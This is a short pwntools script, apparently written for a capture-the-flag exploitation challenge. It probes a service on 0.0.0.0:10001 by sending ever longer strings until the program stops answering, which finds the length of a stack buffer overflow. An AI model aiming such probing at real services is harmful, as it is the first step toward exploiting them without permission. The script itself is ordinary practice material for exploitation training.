#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
ip = "0.0.0.0"
port = 10001

def getbufferflow_length():
	i = 1
	while True:
		try:
			io = remote(ip,port)
			io.recvuntil("Please tell me:")
			io.sendline(i*'a')
			output = io.recvuntil("Goodbye!\n",timeout=1)
			print output
			#hello = io.recv()
			io.close()
			#print "[*] the index is " + str(output.find('Goodbyte!'))
			if output == "":
				return i - 1
			else:
				i += 1
		except EOFError:
			io.close()
			return i - 1

length = getbufferflow_length()
print length
